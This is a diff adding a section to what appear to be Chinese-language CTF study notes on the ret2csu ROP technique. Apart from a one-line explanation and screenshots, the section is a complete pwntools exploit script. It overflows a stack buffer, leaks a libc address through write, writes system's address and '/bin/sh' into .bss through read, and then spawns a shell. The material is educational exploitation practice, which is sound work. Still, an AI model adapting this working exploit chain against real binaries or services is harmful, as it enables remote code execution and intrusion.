@@ -222,11 +222,89 @@ p.interactive()
 
 
 
+---
 
 
 
+## 四：ret2csu构造rop链
 
+![image-20260319205249477](/images/image-20260319205249477.png)
 
+通过对寄存器进行控制完成对于函数的调用。
+
+![image-20260319211834413](/images/image-20260319211834413.png)
+
+![image-20260319211902990](/images/image-20260319211902990.png)
+
+```
+# ############ 阶段 1：利用 write 函数泄漏 libc 地址 ############
+# 0x80 是缓冲区大小，8 是覆盖 rbp 的长度
+payload1 = b'A' * 0x80 + b'B' * 8  # 填充 stack 直到返回地址
+
+# 调用 gadget1 (通常是 pop rbx, rbp, r12, r13, r14, r15, ret)
+payload1 += p64(gadget1)          # 返回到 gadget1
+payload1 += p64(0)                # pop rbx: 设置为 0，方便后续 gadget2 的 call [r12 + rbx*8]
+payload1 += p64(1)                # pop rbp: 设置为 1，使得后续 cmp rbx, rbp 能够通过
+payload1 += p64(write_got)        # pop r12: 后面 gadget2 会 call 这个地址指向的函数（write）
+payload1 += p64(1)                # pop r13: 对应 edi (参数1: fd = 1, stdout)
+payload1 += p64(write_got)        # pop r14: 对应 rsi (参数2: addr = write 的 GOT 地址)
+payload1 += p64(8)                # pop r15: 对应 rdx (参数3: len = 8 字节)
+
+# 调用 gadget2 (通常是 mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8])
+payload1 += p64(gadget2)
+payload1 += b'\x00' * 0x38        # gadget2 执行完后会滑入 gadget1 的 pop 操作，需填充 0x38 字节对齐
+payload1 += p64(main_addr)        # 再次返回 main 函数，等待第二次触发漏洞
+
+p.sendafter('Hello, World\n', payload1)
+
+# 接收泄漏的地址并计算 libc 基址
+write_addr = u64(p.recv(8))
+libc_base = write_addr - libc.sym['write']
+system_addr = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+success("libc_base: {}".format(hex(libc_base)))
+success("system_addr: {}".format(hex(system_addr)))
+success("binsh: {}".format(hex(binsh)))
+
+# ############ 阶段 2：通过 read 函数将数据写入 .bss 段 ############
+payload2 = b'A' * 0x80 + b'B' * 8  # 填充
+payload2 += p64(gadget1)          # 进入 gadget1
+payload2 += p64(0)                # pop rbx
+payload2 += p64(1)                # pop rbp
+payload2 += p64(read_got)         # pop r12: 准备调用 read
+payload2 += p64(0)                # pop r13: 对应 edi (参数1: fd = 0, stdin)
+payload2 += p64(bss_addr)         # pop r14: 对应 rsi (参数2: 写入地址为 .bss)
+payload2 += p64(16)               # pop r15: 对应 rdx (参数3: 读取 16 字节)
+
+payload2 += p64(gadget2)          # 执行 read(0, bss_addr, 16)
+payload2 += b'\x00' * 0x38        # 填充
+payload2 += p64(main_addr)        # 返回 main 准备第三次利用
+
+p.sendafter('Hello, World\n', payload2)
+sleep(1)
+# 发送 8 字节 system 地址 + 8 字节 "/bin/sh" 字符串
+p.send(p64(system_addr) + b'/bin/sh\x00')
+sleep(1)
+
+# ############ 阶段 3：调用 system("/bin/sh") 获取 Shell ############
+payload3 = b'A' * 0x80 + b'B' * 8
+payload3 += p64(gadget1)
+payload3 += p64(0)                # pop rbx
+payload3 += p64(1)                # pop rbp
+payload3 += p64(bss_addr)         # pop r12: [bss_addr] 里现在存的是 system 的地址
+payload3 += p64(bss_addr + 8)     # pop r13: 对应 edi (参数1: 指向 "/bin/sh" 的地址)
+                                  # 注意：此处 edi 只能赋值低 32 位，但通常对 bss 地址足够
+payload3 += p64(0)                # pop r14: rsi = 0
+payload3 += p64(0)                # pop r15: rdx = 0
+
+payload3 += p64(gadget2)          # 执行 call system(rdi="/bin/sh")
+payload3 += b'\x00' * 0x38        # 填充
+payload3 += p64(main_addr)        # 结尾逻辑（此处其实已拿到 shell）
+
+p.sendafter('Hello, World\n', payload3)
+p.interactive()                   # 进入交互模式
+```
 
 
 
